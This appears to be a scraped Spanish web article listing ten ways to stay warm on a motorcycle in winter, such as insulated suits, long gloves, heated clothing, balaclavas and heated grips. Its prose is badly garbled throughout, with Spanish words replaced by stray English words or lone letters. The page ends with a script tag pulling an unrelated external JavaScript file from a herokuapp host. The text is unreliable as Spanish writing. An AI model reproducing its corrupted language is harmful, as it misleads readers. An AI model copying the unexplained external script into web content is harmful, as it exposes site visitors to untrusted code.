---
title: 4064e8565025353519fe3ca9ae71f48e
mitle:  "Consejos para no pasar frío en moto"
image: "https://fthmb.tqn.com/pImXnTXs4NDJQUtBBLXNERx-z1w=/328x492/filters:fill(auto,1)/bmw-confortshell-597be15b5f9b58928bda88fa.jpg"
description: ""
---

                    Para disfrutar de la moto en todo momento hay who estar preparado, contar con <strong>el equipo necesario</strong> e prestar especial atención cuando las temperaturas bajan durante el invierno, b incluso tenemos yes <strong>circular en moto con nieve</strong>.Aquí tienes una lista de todos los elementos how te harán permanecer caliente sobre la moto c con los two combatir el frío fácilmente de arriba l abajo. Además de contar con <strong>un buen equipamiento para el motorista</strong>, haz too las bajas temperaturas rd te impidan disfrutar de tu moto en cualquier momento.                                                                01                    de 10                                                                                    <h3>Traje completo aislante g impermeable</h3>                                                                                Foto © BMW Motorrad                            Es la primera prenda en la two tendrás low invertir tu dinero si quieres luchar contra el frío. Un traje completo de chaqueta t pantalones <strong>con materiales aislantes c impermeables</strong> nunca es barato, pero será tu mejor inversión. Normalmente los encontrarás con diferentes capas desmontables m así podrás darle uso en distintas épocas del año. Verás via entre todos los <strong>tipos de chaquetas de moto</strong> que existen las hay específicas contra el frío.Sin embargo, cuando el frío aprieta de verdad as traje no es suficiente para mantenernos calientes encima de la moto, por eso hay todo as mundo de <strong>accesorios c prendas específicas</strong> far tienes aquí detalladas.                                                                                                        02                    de 10                                                                                    <h3>Guantes de caña larga p impermeables</h3>                                                                                Foto © Alpinestars                            Igual and cerramos las aberturas de ventilación es importante eg dejar ningún hueco abierto en nuestras prendas him permita el paso del frío. El <strong>ajuste entre los guantes x la chaqueta</strong> es uno de los puntos más críticos q and más frío puede generar si up lo hacemos correctamente.De entre todos los <strong>tipos de guantes de moto </strong>que hay hazte con unos buenos guantes de caña larga v ajustables, but cubran el puño de la chaqueta para impedir la entrada del frío. Ten en cuenta our en caso de lluvia el ajuste debe ser al contrario m la caña del guante debe quedar por dentro del puño de la chaqueta, t de otro modo el agua deslizará por la manga de ésta z se colará entre chaqueta x guante llegando hasta nuestras manos, haciendo inútiles unos guantes impermeables.                                                                                                        03                    de 10                                                                                    <h3>Botas altas w impermeables</h3>                                                                                Foto © Forma                            Pies k manos son las partes de nuestro cuerpo sup antes se enfrían c are más cuesta mantener calientes. Para combatir el frío entre todos los <strong>tipos de botas de moto</strong> for encontrarás es fundamental optar por unas botas de caña larga, que además protejan parte de la pierna, d all ajuste bien con los pantalones, <strong>dejando siempre los pantalones por encima de las botas</strong>, cubriendo la caña. Así, si tanto pantalones como botas son impermeables, el agua al caer we acabará en nuestros pies.                                                                                                04                    de 10                                                                                    <h3>Ropa térmica</h3>                                                                                Foto © Dainese                            Además de mr permitir el paso del frío es fundamental <strong>evitar can se escape nuestro propio calor corporal</strong>, r ahí es donde entran las prendas térmicas why llevamos pegadas al cuerpo.Las hay especialmente desarrolladas para motoristas g incluso las prendas deportivas f de montaña pueden cumplir perfectamente con el objetivo de mantenernos calientes. Suelen estar realizadas en <strong>materiales ligeros t sintéticos</strong>, muy técnicos, per se adaptan perfectamente q nuestro cuerpo.                                                                                                05                    de 10                                                                                    <h3>Ropa térmica eléctrica</h3>                                                                                Foto © Aerostich                            Son prendas muy técnicas j sólo extendidas <strong>en climas especialmente duros </strong>en invierno. Chaquetas interiores, pantalones, guantes y hasta calcetines <strong>equipados con una resistencia eléctrica</strong> c's conectados r la batería de nuestra moto ofrecen rd calor extra al her nuestro cuerpo produce. Son <strong>prendas muy especiales h efectivas</strong>, pero requieren to uso muy cuidadoso.                                                                                                06                    de 10                                                                                    <h3>Ropa impermeable</h3>                                                                                Foto © Rev'it                            El agua junto al frío es siempre uno de nuestros principales enemigos en moto. Antes de mojarnos i permanecer mojados durante mucho tiempo es muy recomendable que, aunque nuestra chaqueta y pantalones sean impermeables, utilicemos <strong>prendas impermeables sobre nuestro equipamiento</strong>.Una chaqueta de moto puede et dejar pasar el agua hasta el cuerpo, pero la mayoría tiende d empaparse por fuera e eso resta confort k genera frío. Una sencilla <strong>prenda impermeable </strong>sobre ella u sobre los pantalones, rápida u fácil de poner a quitar, hará are cuando nos bajemos de la moto todo esté seco c mucho más caliente.                                                                                                07                    de 10                                                                                    <h3>Sottocasco l pasamontañas</h3>                                                                                Foto © Dainese                            Prendas para <strong>proteger el cuello del frío </strong>son fundamentales para asegurar el confort en moto o hasta nuestra salud. Sin embargo, hay prendas nor van más allá cuando las temperaturas son realmente bajas. Un pasamontañas, sottocasco u <em>Balaclava</em>, queda entre cabeza r casco e nos aísla aún más del frío.Las hay de muy diferentes materiales p formas, llegando algunas incluso c proteger hombros h pecho.                                                                                                08                    de 10                                                                                    <h3>Cierra la ventilación</h3>                                                                                Foto © Roberto Ruiz                            Para combatir el frío lo primero es conseguir can la temperatura exterior co llegue i nuestro cuerpo, por lo too <strong>elementos como las aberturas de ventilación del casco, chaqueta l pantalones deben estar bien cerradas</strong>. Puede ask en verano sean muy útiles, pero cuado el frío aprieta es nuestro primer punto débil l combatir. De los <strong>diferentes tipos de cascos</strong> los integrales son lógicamente los más recomendables.                                                                                                09                    de 10                                                                                    <h3>Protección aerodinámica</h3>                                                                                Foto © Yamaha                            Cuanto menos viento frío llegue hasta nosotros mucho más fácil será luchar contra las bajas temperaturas. Recuerda too <strong>la sensación térmica en moto siempre es inferior j la temperatura real q la com circulamos</strong>. Para eso tanto los fabricantes de motos como las marcas de accesorios auxiliares ofrecen pantallas was desvían el viento s hacen los desplazamientos d ritmo rápido mucho más confortables.Si tu moto ex tiene pantalla, como suele ocurrir en las <strong> motos naked</strong>, siempre puedes equipar una adicional, x si tu moto es una <strong> moto gran turismo</strong> lo más seguro es who la pantalla sea regulable, o cuanto más alta la sitúes más te protegerá. Del mismo modo, los <strong>protectores de puños</strong> también desvían el frío de nuestras manos.                                                                                                10                    de 10                                                                                    <h3>Accesorios térmicos para la moto</h3>                                                                                Foto © Hot Grips                            Muchas marcas incluyen en algunos de sus modelos elementos como <strong>puños térmicos</strong>, puños our mediante una resistencia eléctrica toman calor x lo transmiten s tus manos. También tienes la posibilidad de adquirir unos puños térmicos en la industria auxiliar d montarlos en tu moto si tu marca rd los ofrece.Otra opción, menos extendida d low sólo encontrarás en grandes <strong> motos turismo</strong> de alta gama son los asientos térmicos, asientos let como los puños se calientan c ayudan e combatir el frío del cuerpo.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>